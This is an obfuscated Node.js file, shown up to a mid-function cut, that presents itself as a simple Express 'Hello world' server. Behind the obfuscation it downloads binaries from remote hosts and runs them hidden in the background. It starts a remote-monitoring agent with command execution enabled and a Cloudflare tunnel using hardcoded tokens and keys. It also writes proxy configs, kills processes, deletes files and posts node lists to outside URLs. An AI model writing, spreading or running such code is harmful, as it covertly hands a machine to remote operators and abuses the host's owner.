const _0x1b1022=_0x5380;(function(_0x3abd83,_0x2f1531){const _0xfac877={_0x511ba3:0x20b,_0x140258:0x1a1,_0x20a782:0x1ca},_0x18e206=_0x5380,_0x58efca=_0x3abd83();while(!![]){try{const _0x964f76=-parseInt(_0x18e206(0x259))/0x1+-parseInt(_0x18e206(0x1b3))/0x2+parseInt(_0x18e206(0x1c1))/0x3+-parseInt(_0x18e206(0x215))/0x4*(parseInt(_0x18e206(0x232))/0x5)+-parseInt(_0x18e206(_0xfac877._0x511ba3))/0x6*(-parseInt(_0x18e206(_0xfac877._0x140258))/0x7)+-parseInt(_0x18e206(0x1fd))/0x8*(parseInt(_0x18e206(_0xfac877._0x20a782))/0x9)+parseInt(_0x18e206(0x1a7))/0xa;if(_0x964f76===_0x2f1531)break;else _0x58efca['push'](_0x58efca['shift']());}catch(_0xfec151){_0x58efca['push'](_0x58efca['shift']());}}}(_0x2baf,0xa5c2e));const express=require(_0x1b1022(0x238)),app=express(),axios=require(_0x1b1022(0x227)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x1b1022(0x1c9)),exec=promisify(require('child_process')[_0x1b1022(0x1c5)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x1b1022(0x22e)][_0x1b1022(0x246)]||'',PROJECT_URL=process[_0x1b1022(0x22e)][_0x1b1022(0x203)]||'',AUTO_ACCESS=process['env'][_0x1b1022(0x1bc)]||![],FILE_PATH=process[_0x1b1022(0x22e)]['FILE_PATH']||_0x1b1022(0x23f),SUB_PATH=process[_0x1b1022(0x22e)]['SUB_PATH']||_0x1b1022(0x223),PORT=process[_0x1b1022(0x22e)][_0x1b1022(0x1a0)]||process['env'][_0x1b1022(0x1b5)]||0xbb8,UUID=process[_0x1b1022(0x22e)][_0x1b1022(0x1bb)]||_0x1b1022(0x1f1),NEZHA_SERVER=process[_0x1b1022(0x22e)][_0x1b1022(0x1dc)]||_0x1b1022(0x204),NEZHA_PORT=process[_0x1b1022(0x22e)][_0x1b1022(0x1b6)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'fXYWSXfEZbSHMuGHEhcJjisCWDInLBtR',ARGO_DOMAIN=process[_0x1b1022(0x22e)]['ARGO_DOMAIN']||_0x1b1022(0x208),ARGO_AUTH=process['env'][_0x1b1022(0x1e4)]||'eyJhIjoiNTI2NjQ3MGU5ZmZiZmYwMWU1ZmI5Yzk1NjExNjZhZmYiLCJ0IjoiZTExYzZjODktNjBkZC00OTJkLWFiNmEtMjk5YjAxMDU0NmNlIiwicyI6Ill6Z3laalJrTWprdE5ESXlNaTAwTVRsaExXRXlOREV0WWpBeFptUXpOREZsTmpKaSJ9',ARGO_PORT=process['env'][_0x1b1022(0x1ee)]||0x1f41,CFIP=process[_0x1b1022(0x22e)][_0x1b1022(0x212)]||'cdns.doon.eu.org',CFPORT=process[_0x1b1022(0x22e)]['CFPORT']||0x1bb,NAME=process[_0x1b1022(0x22e)]['NAME']||'lumixcore1';!fs[_0x1b1022(0x200)](FILE_PATH)?(fs[_0x1b1022(0x1c0)](FILE_PATH),console[_0x1b1022(0x1ab)](FILE_PATH+'\x20is\x20created')):console[_0x1b1022(0x1ab)](FILE_PATH+_0x1b1022(0x226));function generateRandomName(){const _0x45175e={_0x1b1d84:0x1cd},_0x55a177=_0x1b1022,_0x236b0e=_0x55a177(_0x45175e._0x1b1d84);let _0x52c101='';for(let _0x2c4f4d=0x0;_0x2c4f4d<0x6;_0x2c4f4d++){_0x52c101+=_0x236b0e[_0x55a177(0x245)](Math[_0x55a177(0x225)](Math[_0x55a177(0x1ce)]()*_0x236b0e['length']));}return _0x52c101;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1b1022(0x21a)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x1b1022(0x21a)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x1b1022(0x21a)](FILE_PATH,_0x1b1022(0x229)),listPath=path['join'](FILE_PATH,_0x1b1022(0x206)),bootLogPath=path[_0x1b1022(0x21a)](FILE_PATH,_0x1b1022(0x1d6)),configPath=path[_0x1b1022(0x21a)](FILE_PATH,_0x1b1022(0x1a2));function deleteNodes(){const _0x5b5b1e={_0x362bf8:0x22b,_0x41c30c:0x1f7,_0xd31a9c:0x205,_0x543e36:0x1aa,_0xc775e:0x1ec,_0x48c3b8:0x1cb},_0x571506=_0x1b1022;try{if(!UPLOAD_URL)return;if(!fs[_0x571506(0x200)](subPath))return;let _0x47e8d7;try{_0x47e8d7=fs['readFileSync'](subPath,_0x571506(0x205));}catch{return null;}const _0x2b8691=Buffer[_0x571506(_0x5b5b1e._0x362bf8)](_0x47e8d7,_0x571506(_0x5b5b1e._0x41c30c))['toString'](_0x571506(_0x5b5b1e._0xd31a9c)),_0x3a67ab=_0x2b8691[_0x571506(0x1d4)]('\x0a')[_0x571506(_0x5b5b1e._0x543e36)](_0x475088=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x571506(0x1a9)](_0x475088));if(_0x3a67ab[_0x571506(0x20a)]===0x0)return;return axios['post'](UPLOAD_URL+_0x571506(0x24a),JSON[_0x571506(_0x5b5b1e._0xc775e)]({'nodes':_0x3a67ab}),{'headers':{'Content-Type':_0x571506(_0x5b5b1e._0x48c3b8)}})['catch'](_0x7a0bee=>{return null;}),null;}catch(_0x476253){return null;}}function cleanupOldFiles(){const _0x3a9e55=_0x1b1022;try{const _0x41f69b=fs[_0x3a9e55(0x1bf)](FILE_PATH);_0x41f69b[_0x3a9e55(0x24c)](_0xb600b5=>{const _0x1f3e37=_0x3a9e55,_0x40e392=path['join'](FILE_PATH,_0xb600b5);try{const _0x3bc2fa=fs['statSync'](_0x40e392);_0x3bc2fa[_0x1f3e37(0x201)]()&&fs[_0x1f3e37(0x1ae)](_0x40e392);}catch(_0xe6698e){}});}catch(_0x2327e7){}}app['get']('/',function(_0x3c26b4,_0x58f1f0){const _0x555dcf=_0x1b1022;_0x58f1f0[_0x555dcf(0x1de)]('Hello\x20world!');});function _0x2baf(){const _0x9a433d=['Nodes\x20uploaded\x20successfully','2096','tunnel.json','catch','21309590NSYyCF','&fp=firefox&type=ws&host=','test','filter','log','post','freedom','unlinkSync','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','443','/vmess-argo?ed=2560','--tls','2222434zXcCUm','match','PORT','NEZHA_PORT','\x0a\x20\x20tunnel:\x20','\x20-p\x20','\x20>\x20nul\x202>&1','\x20is\x20running','UUID','AUTO_ACCESS','block','npm\x20running\x20error:\x20','readdirSync','mkdirSync','3523875qxSFhH','https://amd64.ssss.nyc.mn/bot','taskkill\x20/f\x20/im\x20','rm\x20-rf\x20','exec','aarch64','pipe','/vless-argo','util','736821ByTDTF','application/json','https://ipapi.co/json/','abcdefghijklmnopqrstuvwxyz','random','8443','\x0avless://','readFileSync','data','\x20successfully','split','toString','boot.log','https://amd64.ssss.nyc.mn/web','https+local://8.8.8.8/dns-query','xtls-rprx-vision','error','quic','NEZHA_SERVER','text/plain;\x20charset=utf-8','send','127.0.0.1','arm','Error\x20in\x20startserver:','has','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','ARGO_AUTH','/trojan-argo','includes','basename','Error\x20executing\x20command:\x20','blackhole','/vmess-argo','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','stringify','none','ARGO_PORT','\x20-c\x20','ArgoDomain:','80e2441a-736d-4eaa-8d01-9a78e4cfa17b','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','&path=%2Ftrojan-argo%3Fed%3D2560#','https://arm64.ssss.nyc.mn/v1','amd','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','base64','&path=%2Fvless-argo%3Fed%3D2560#','http://ip-api.com/json/','Unhandled\x20error\x20in\x20startserver:','arm64','/config.json\x20>/dev/null\x202>&1\x20&','32mVgSuG','vless','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','existsSync','isFile','Unknown','PROJECT_URL','v1.wbxl.dpdns.org:10024','utf-8','list.txt','TunnelSecret','lumixcore.wbxl00.ggff.net','App\x20is\x20running','length','223662MvMrjQ','platform','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','pkill\x20-f\x20\x22[','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','createWriteStream','NEZHA\x20variable\x20is\x20empty,skip\x20running','CFIP','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x0aclient_secret:\x20','36748xNSqta','finish','countryCode','2087','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','join','direct','unshift','trojan','writeFileSync','all','\x22\x20>\x20/dev/null\x202>&1','Empowerment\x20failed\x20for\x20','/api/add-subscriptions','sub','response','floor','\x20already\x20exists','axios','tls','sub.txt','\x0a\x0avmess://','from','web\x20running\x20error:\x20','automatic\x20access\x20task\x20added\x20successfully','env','false','\x0a\x20\x20\x20\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','265TOyHFE','fileUrl','\x20>/dev/null\x202>&1\x20&','win32','pop','get','express','tcp','success','\x0a\x0atrojan://','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','arch','https://oooo.serv00.net/add-url','./tmp','\x20failed:\x20','2083','status','message','nohup\x20','charAt','UPLOAD_URL','http\x20server\x20is\x20running\x20on\x20port:','/sub.txt\x20saved\x20successfully','org','/api/delete-nodes','/dev/null','forEach','clear','substring','\x20-c\x20\x22','2053','country_code','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x20-s\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','http','Download\x20','map','https://arm64.ssss.nyc.mn/agent','812853XQkYdc','push','vmess','SERVER_PORT','21vzVoNO','config.json'];_0x2baf=function(){return _0x9a433d;};return _0x2baf();}async function generateConfig(){const _0x591fb0={_0x40201f:0x24b,_0x4b00ce:0x1ed,_0x4de8b6:0x1d9,_0x3092f9:0x1ed,_0x586b78:0x1fe,_0x221c41:0x1ed,_0x6a6e17:0x1c8,_0x3e972e:0x255,_0x3a61a6:0x1db,_0x1c5ed5:0x1df,_0x27b16a:0x21d,_0x37bac7:0x1e5,_0x58549e:0x255,_0x4efdc2:0x228,_0x27a1a3:0x1ad,_0x30cdcc:0x21b,_0x1cb795:0x1a2},_0x978f5f=_0x1b1022,_0x93ddce={'log':{'access':_0x978f5f(0x24b),'error':_0x978f5f(_0x591fb0._0x40201f),'loglevel':_0x978f5f(_0x591fb0._0x4b00ce)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x978f5f(0x1fe),'settings':{'clients':[{'id':UUID,'flow':_0x978f5f(_0x591fb0._0x4de8b6)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x978f5f(0x1c8),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x978f5f(0x239)}},{'port':0xbb9,'listen':_0x978f5f(0x1df),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x978f5f(0x1ed)},'streamSettings':{'network':_0x978f5f(0x239),'security':_0x978f5f(_0x591fb0._0x3092f9)}},{'port':0xbba,'listen':_0x978f5f(0x1df),'protocol':_0x978f5f(_0x591fb0._0x586b78),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x978f5f(_0x591fb0._0x221c41)},'streamSettings':{'network':'ws','security':_0x978f5f(0x1ed),'wsSettings':{'path':_0x978f5f(_0x591fb0._0x6a6e17)}},'sniffing':{'enabled':!![],'destOverride':[_0x978f5f(_0x591fb0._0x3e972e),_0x978f5f(0x228),_0x978f5f(_0x591fb0._0x3a61a6)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x978f5f(0x19f),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x978f5f(0x1ea)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x978f5f(0x228),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x978f5f(_0x591fb0._0x1c5ed5),'protocol':_0x978f5f(_0x591fb0._0x27b16a),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x978f5f(0x1ed),'wsSettings':{'path':_0x978f5f(_0x591fb0._0x37bac7)}},'sniffing':{'enabled':!![],'destOverride':[_0x978f5f(_0x591fb0._0x58549e),_0x978f5f(_0x591fb0._0x4efdc2),_0x978f5f(0x1db)],'metadataOnly':![]}}],'dns':{'servers':[_0x978f5f(0x1d8)]},'outbounds':[{'protocol':_0x978f5f(_0x591fb0._0x27a1a3),'tag':_0x978f5f(_0x591fb0._0x30cdcc)},{'protocol':_0x978f5f(0x1e9),'tag':_0x978f5f(0x1bd)}]};fs[_0x978f5f(0x21e)](path['join'](FILE_PATH,_0x978f5f(_0x591fb0._0x1cb795)),JSON[_0x978f5f(0x1ec)](_0x93ddce,null,0x2));}function getSystemArchitecture(){const _0x2bbf81={_0x4589b0:0x1e0,_0xed6d1e:0x1fb,_0x1c1e7b:0x1c6,_0x3ae693:0x1f5},_0x168dc6=_0x1b1022,_0x3a36a9=os[_0x168dc6(0x23d)]();return _0x3a36a9===_0x168dc6(_0x2bbf81._0x4589b0)||_0x3a36a9===_0x168dc6(_0x2bbf81._0xed6d1e)||_0x3a36a9===_0x168dc6(_0x2bbf81._0x1c1e7b)?_0x168dc6(_0x2bbf81._0x4589b0):_0x168dc6(_0x2bbf81._0x3ae693);}function downloadFile(_0xd892bf,_0x53a78b,_0x1523c1){const _0x3de7bc={_0x2ed6d0:0x200,_0x876437:0x1c0,_0x2455a6:0x210},_0x44cb1f={_0x5a2696:0x256,_0x572724:0x1e7,_0x1154a0:0x243,_0xd156a0:0x1da},_0x3d4141={_0x2d46b5:0x1d2,_0xc8b122:0x1c7},_0x2e224a={_0x44d621:0x240},_0x566053=_0x1b1022,_0x164bb9=_0xd892bf;!fs[_0x566053(_0x3de7bc._0x2ed6d0)](FILE_PATH)&&fs[_0x566053(_0x3de7bc._0x876437)](FILE_PATH,{'recursive':!![]});const _0x4e6fd8=fs[_0x566053(_0x3de7bc._0x2455a6)](_0x164bb9);axios({'method':'get','url':_0x53a78b,'responseType':'stream'})['then'](_0x341652=>{const _0x118ec5={_0x5f5d7b:0x256,_0x26a84c:0x1d3},_0x4ee8d7=_0x566053;_0x341652[_0x4ee8d7(_0x3d4141._0x2d46b5)][_0x4ee8d7(_0x3d4141._0xc8b122)](_0x4e6fd8),_0x4e6fd8['on'](_0x4ee8d7(0x216),()=>{const _0x268a65=_0x4ee8d7;_0x4e6fd8['close'](),console[_0x268a65(0x1ab)](_0x268a65(_0x118ec5._0x5f5d7b)+path['basename'](_0x164bb9)+_0x268a65(_0x118ec5._0x26a84c)),_0x1523c1(null,_0x164bb9);}),_0x4e6fd8['on'](_0x4ee8d7(0x1da),_0x325d88=>{const _0x59c083=_0x4ee8d7;fs['unlink'](_0x164bb9,()=>{});const _0x444174=_0x59c083(0x256)+path[_0x59c083(0x1e7)](_0x164bb9)+_0x59c083(_0x2e224a._0x44d621)+_0x325d88['message'];console[_0x59c083(0x1da)](_0x444174),_0x1523c1(_0x444174);});})['catch'](_0x1ae5cc=>{const _0x80bfb8=_0x566053,_0x21c9e=_0x80bfb8(_0x44cb1f._0x5a2696)+path[_0x80bfb8(_0x44cb1f._0x572724)](_0x164bb9)+'\x20failed:\x20'+_0x1ae5cc[_0x80bfb8(_0x44cb1f._0x1154a0)];console[_0x80bfb8(_0x44cb1f._0xd156a0)](_0x21c9e),_0x1523c1(_0x21c9e);});}async function downloadFilesAndRun(){const _0x426541={_0x523a37:0x1f2,_0x29c5f5:0x1da,_0x3e6740:0x1e6,_0x11a976:0x1b0,_0x30ca71:0x218,_0x35f416:0x22f,_0x523582:0x214,_0x550d97:0x20f,_0x2b3046:0x252,_0x214b1f:0x254,_0x8f6146:0x21e,_0x2bbaae:0x1a4,_0x55414f:0x1e6,_0x2cdb5c:0x1b2,_0x59d921:0x1da,_0x528f6b:0x1ab,_0x501261:0x1ef,_0x415672:0x1ba,_0x225217:0x1b4,_0x10bd17:0x1f6,_0x95e733:0x1ff,_0x11f94a:0x244,_0x275a4d:0x1da},_0x44ddbc={_0x4cba71:0x233},_0xef7d64=_0x1b1022,_0xb1ebda=getSystemArchitecture(),_0x4cafc4=getFilesForArchitecture(_0xb1ebda);if(_0x4cafc4['length']===0x0){console[_0xef7d64(0x1ab)](_0xef7d64(_0x426541._0x523a37));return;}const _0x504c59=_0x4cafc4[_0xef7d64(0x257)](_0xfdb910=>{return new Promise((_0x1278c7,_0x164c5b)=>{const _0x45fa62=_0x5380;downloadFile(_0xfdb910['fileName'],_0xfdb910[_0x45fa62(_0x44ddbc._0x4cba71)],(_0x5c02d8,_0x2fd0a9)=>{_0x5c02d8?_0x164c5b(_0x5c02d8):_0x1278c7(_0x2fd0a9);});});});try{await Promise[_0xef7d64(0x21f)](_0x504c59);}catch(_0x42c89f){console[_0xef7d64(_0x426541._0x29c5f5)]('Error\x20downloading\x20files:',_0x42c89f);return;}function _0x308aed(_0x123128){const _0x1dff62=_0xef7d64,_0x41b186=0x1fd;_0x123128[_0x1dff62(0x24c)](_0xd23ec3=>{const _0x4e2d70={_0x45f894:0x221,_0x1900d8:0x1d5};fs['existsSync'](_0xd23ec3)&&fs['chmod'](_0xd23ec3,_0x41b186,_0x425a13=>{const _0x2791dd=_0x5380;_0x425a13?console['error'](_0x2791dd(_0x4e2d70._0x45f894)+_0xd23ec3+':\x20'+_0x425a13):console['log']('Empowerment\x20success\x20for\x20'+_0xd23ec3+':\x20'+_0x41b186[_0x2791dd(_0x4e2d70._0x1900d8)](0x8));});});}const _0x451273=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x308aed(_0x451273);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x37bfa7=NEZHA_SERVER[_0xef7d64(_0x426541._0x3e6740)](':')?NEZHA_SERVER['split'](':')[_0xef7d64(0x236)]():'',_0x2a8bcf=new Set([_0xef7d64(_0x426541._0x11a976),_0xef7d64(0x1cf),_0xef7d64(0x1a4),_0xef7d64(_0x426541._0x30ca71),_0xef7d64(0x241),'2053']),_0x5e5367=_0x2a8bcf[_0xef7d64(0x1e2)](_0x37bfa7)?'true':_0xef7d64(_0x426541._0x35f416),_0x1d6190=_0xef7d64(_0x426541._0x523582)+NEZHA_KEY+_0xef7d64(_0x426541._0x550d97)+NEZHA_SERVER+_0xef7d64(_0x426541._0x2b3046)+_0x5e5367+_0xef7d64(_0x426541._0x214b1f)+UUID;fs[_0xef7d64(_0x426541._0x8f6146)](path[_0xef7d64(0x21a)](FILE_PATH,'config.yaml'),_0x1d6190);const _0x3a1def='nohup\x20'+phpPath+_0xef7d64(0x24f)+FILE_PATH+_0xef7d64(0x20d);try{await exec(_0x3a1def),console[_0xef7d64(0x1ab)](phpName+_0xef7d64(0x1ba)),await new Promise(_0x17304e=>setTimeout(_0x17304e,0x3e8));}catch(_0x44f799){console['error']('php\x20running\x20error:\x20'+_0x44f799);}}else{let _0x3c4f68='';const _0x1b4fc6=[_0xef7d64(0x1b0),_0xef7d64(0x1cf),_0xef7d64(_0x426541._0x2bbaae),'2087','2083',_0xef7d64(0x250)];_0x1b4fc6[_0xef7d64(_0x426541._0x55414f)](NEZHA_PORT)&&(_0x3c4f68=_0xef7d64(_0x426541._0x2cdb5c));const _0x1d5284='nohup\x20'+npmPath+_0xef7d64(0x253)+NEZHA_SERVER+':'+NEZHA_PORT+_0xef7d64(0x1b8)+NEZHA_KEY+'\x20'+_0x3c4f68+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1d5284),console['log'](npmName+'\x20is\x20running'),await new Promise(_0x776ac0=>setTimeout(_0x776ac0,0x3e8));}catch(_0x204061){console[_0xef7d64(_0x426541._0x59d921)](_0xef7d64(0x1be)+_0x204061);}}}else console[_0xef7d64(_0x426541._0x528f6b)](_0xef7d64(0x211));const _0x223928=_0xef7d64(0x244)+webPath+_0xef7d64(_0x426541._0x501261)+FILE_PATH+_0xef7d64(0x1fc);try{await exec(_0x223928),console['log'](webName+_0xef7d64(_0x426541._0x415672)),await new Promise(_0x273249=>setTimeout(_0x273249,0x3e8));}catch(_0x4ac0bf){console[_0xef7d64(0x1da)](_0xef7d64(0x22c)+_0x4ac0bf);}if(fs['existsSync'](botPath)){let _0x41bed1;if(ARGO_AUTH[_0xef7d64(0x1b4)](/^[A-Z0-9a-z=]{120,250}$/))_0x41bed1=_0xef7d64(0x23c)+ARGO_AUTH;else ARGO_AUTH[_0xef7d64(_0x426541._0x225217)](/TunnelSecret/)?_0x41bed1=_0xef7d64(_0x426541._0x10bd17)+FILE_PATH+'/tunnel.yml\x20run':_0x41bed1=_0xef7d64(_0x426541._0x95e733)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0xef7d64(_0x426541._0x11f94a)+botPath+'\x20'+_0x41bed1+'\x20>/dev/null\x202>&1\x20&'),console[_0xef7d64(0x1ab)](botName+'\x20is\x20running'),await new Promise(_0x213730=>setTimeout(_0x213730,0x7d0));}catch(_0x55c7be){console[_0xef7d64(_0x426541._0x275a4d)](_0xef7d64(0x1e8)+_0x55c7be);}}await new Promise(_0x233b43=>setTimeout(_0x233b43,0x1388));}function getFilesForArchitecture(_0x36ed5f){const _0x6ef542={_0x5f406a:0x1e0,_0x4b5da1:0x1d7,_0x4bf50f:0x258},_0x42aeb8=_0x1b1022;let _0x218830;_0x36ed5f===_0x42aeb8(_0x6ef542._0x5f406a)?_0x218830=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x218830=[{'fileName':webPath,'fileUrl':_0x42aeb8(_0x6ef542._0x4b5da1)},{'fileName':botPath,'fileUrl':_0x42aeb8(0x1c2)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2f52a5=_0x36ed5f===_0x42aeb8(_0x6ef542._0x5f406a)?_0x42aeb8(_0x6ef542._0x4bf50f):'https://amd64.ssss.nyc.mn/agent';_0x218830[_0x42aeb8(0x21c)]({'fileName':npmPath,'fileUrl':_0x2f52a5});}else{const _0x269ec9=_0x36ed5f===_0x42aeb8(0x1e0)?_0x42aeb8(0x1f4):'https://amd64.ssss.nyc.mn/v1';_0x218830[_0x42aeb8(0x21c)]({'fileName':phpPath,'fileUrl':_0x269ec9});}}return _0x218830;}function argoType(){const _0x2a5827={_0x2a3815:0x207,_0x4f7a86:0x1a5,_0xb8f63d:0x1b7,_0x341fb4:0x1d4,_0x9ab24f:0x1eb,_0x2927d9:0x1af,_0x2629bb:0x21a,_0x3082e9:0x1ab},_0x2bc891=_0x1b1022;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x2bc891(0x1e6)](_0x2bc891(_0x2a5827._0x2a3815))){fs[_0x2bc891(0x21e)](path[_0x2bc891(0x21a)](FILE_PATH,_0x2bc891(_0x2a5827._0x4f7a86)),ARGO_AUTH);const _0x58fde0=_0x2bc891(_0x2a5827._0xb8f63d)+ARGO_AUTH[_0x2bc891(_0x2a5827._0x341fb4)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x2bc891(0x21a)](FILE_PATH,_0x2bc891(0x1a5))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x2bc891(_0x2a5827._0x9ab24f)+ARGO_PORT+_0x2bc891(_0x2a5827._0x2927d9);fs[_0x2bc891(0x21e)](path[_0x2bc891(_0x2a5827._0x2629bb)](FILE_PATH,'tunnel.yml'),_0x58fde0);}else console[_0x2bc891(_0x2a5827._0x3082e9)](_0x2bc891(0x213));}async function extractDomains(){const _0x240902={_0x58055f:0x205,_0x4945bc:0x20a,_0x4b06ba:0x1ab,_0x19b2ba:0x1ab,_0x8d2ad9:0x219,_0x332c3c:0x1ae,_0x546786:0x231,_0xa28417:0x234,_0x2f4254:0x1da},_0x5f1346={_0x2cbf99:0x249,_0x316473:0x1d2,_0x146e5e:0x251,_0x373421:0x249,_0x30a382:0x1d2,_0x73e0a6:0x23a,_0x496fa0:0x217,_0x34da34:0x249,_0x598d63:0x202},_0x1e063d={_0xfe15a5:0x1c3,_0x9e2d1c:0x20e,_0x3b7001:0x220},_0x462754={_0x3c0198:0x1b4},_0x512f8f=_0x1b1022;let _0x4b00fe;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4b00fe=ARGO_DOMAIN,console[_0x512f8f(0x1ab)]('ARGO_DOMAIN:',_0x4b00fe),await _0x5363f8(_0x4b00fe);else try{const _0x46fb82=fs[_0x512f8f(0x1d1)](path[_0x512f8f(0x21a)](FILE_PATH,_0x512f8f(0x1d6)),_0x512f8f(_0x240902._0x58055f)),_0x441714=_0x46fb82['split']('\x0a'),_0x428b8e=[];_0x441714['forEach'](_0x6551e4=>{const _0x332702=_0x512f8f,_0x39f47d=_0x6551e4[_0x332702(_0x462754._0x3c0198)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x39f47d){const _0x37c7af=_0x39f47d[0x1];_0x428b8e['push'](_0x37c7af);}});if(_0x428b8e[_0x512f8f(_0x240902._0x4945bc)]>0x0)_0x4b00fe=_0x428b8e[0x0],console[_0x512f8f(_0x240902._0x4b06ba)](_0x512f8f(0x1f0),_0x4b00fe),await _0x5363f8(_0x4b00fe);else{console[_0x512f8f(_0x240902._0x19b2ba)](_0x512f8f(_0x240902._0x8d2ad9)),fs[_0x512f8f(_0x240902._0x332c3c)](path[_0x512f8f(0x21a)](FILE_PATH,'boot.log'));async function _0x389f7a(){const _0x533b41=_0x512f8f;try{process[_0x533b41(0x20c)]==='win32'?await exec(_0x533b41(_0x1e063d._0xfe15a5)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x533b41(_0x1e063d._0x9e2d1c)+botName['charAt'](0x0)+']'+botName[_0x533b41(0x24e)](0x1)+_0x533b41(_0x1e063d._0x3b7001));}catch(_0x361855){}}_0x389f7a(),await new Promise(_0x16209f=>setTimeout(_0x16209f,0xbb8));const _0x2b89e5=_0x512f8f(0x1ff)+FILE_PATH+_0x512f8f(_0x240902._0x546786)+ARGO_PORT;try{await exec(_0x512f8f(0x244)+botPath+'\x20'+_0x2b89e5+_0x512f8f(_0x240902._0xa28417)),console[_0x512f8f(_0x240902._0x4b06ba)](botName+'\x20is\x20running'),await new Promise(_0x55a272=>setTimeout(_0x55a272,0xbb8)),await extractDomains();}catch(_0x49fae9){console[_0x512f8f(_0x240902._0x2f4254)]('Error\x20executing\x20command:\x20'+_0x49fae9);}}}catch(_0x4df7db){console['error']('Error\x20reading\x20boot.log:',_0x4df7db);}async function _0x3ba960(){const _0x5c16c1=_0x512f8f;try{const _0x526ab1=await axios['get'](_0x5c16c1(0x1cc),{'timeout':0xbb8});if(_0x526ab1['data']&&_0x526ab1[_0x5c16c1(0x1d2)][_0x5c16c1(0x251)]&&_0x526ab1['data'][_0x5c16c1(_0x5f1346._0x2cbf99)])return _0x526ab1[_0x5c16c1(_0x5f1346._0x316473)][_0x5c16c1(_0x5f1346._0x146e5e)]+'_'+_0x526ab1['data'][_0x5c16c1(_0x5f1346._0x373421)];}catch(_0x6c20ff){try{const _0x40c369=await axios['get'](_0x5c16c1(0x1f9),{'timeout':0xbb8});if(_0x40c369[_0x5c16c1(_0x5f1346._0x30a382)]&&_0x40c369[_0x5c16c1(0x1d2)][_0x5c16c1(0x242)]===_0x5c16c1(_0x5f1346._0x73e0a6)&&_0x40c369['data'][_0x5c16c1(_0x5f1346._0x496fa0)]&&_0x40c369['data'][_0x5c16c1(_0x5f1346._0x34da34)])return _0x40c369[_0x5c16c1(_0x5f1346._0x316473)][_0x5c16c1(_0x5f1346._0x496fa0)]+'_'+_0x40c369['data'][_0x5c16c1(_0x5f1346._0x34da34)];}catch(_0x2858a6){}}return _0x5c16c1(_0x5f1346._0x598d63);}async function _0x5363f8(_0x19a0fe){const _0xd13d1a={_0x3dc0cc:0x228,_0x40a1ca:0x1d0,_0x938901:0x1f8,_0x465ec6:0x1ec,_0x1fce22:0x1d5,_0x155a3e:0x21e,_0x77df86:0x1d5,_0x4ae6a6:0x1f7,_0x432d89:0x1ab,_0x556397:0x237},_0x1af289=await _0x3ba960(),_0x4b19f1=NAME?NAME+'-'+_0x1af289:_0x1af289;return new Promise(_0x1b6808=>{setTimeout(()=>{const 